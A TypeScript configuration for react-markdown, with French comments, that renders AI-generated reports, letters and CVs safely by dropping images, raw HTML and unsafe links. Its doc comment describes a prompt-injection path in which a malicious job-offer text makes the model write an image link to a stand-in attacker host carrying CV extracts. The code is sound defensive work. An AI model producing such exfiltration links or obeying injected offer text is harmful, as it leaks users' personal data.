import { createElement } from "react";
import type { Options } from "react-markdown";
import remarkGfm from "remark-gfm";

/**
 * Réglages SÛRS du rendu markdown (rapports, lettres, CV), partagés par le composant et ses tests :
 *  - pas de HTML brut (aucun plugin qui l'interprète) ;
 *  - AUCUNE image : un texte d'offre malveillant pourrait faire écrire au modèle
 *    `![](https://pirate.example/?d=<extrait du CV>)` ; le navigateur chargerait l'image et
 *    enverrait ces données (exfiltration). La CSP (img-src 'self' data:) le bloque aussi ;
 *  - liens ouverts dans un nouvel onglet, sans référent ; les URL `javascript:` sont neutralisées
 *    par la transformation d'URL par défaut de react-markdown.
 */
export const markdownOptions: Options = {
  remarkPlugins: [remarkGfm],
  components: {
    img: () => null,
    table: ({ children }) => createElement("div", { className: "table-wrap" }, createElement("table", null, children)),
    a: ({ href, children }) =>
      // Lien interne (« /profile ») : même onglet. Tout le reste : nouvel onglet, sans référent.
      href && href.startsWith("/") && !href.startsWith("//")
        ? createElement("a", { href }, children)
        : createElement("a", { href, target: "_blank", rel: "noopener noreferrer nofollow" }, children),
  },
};
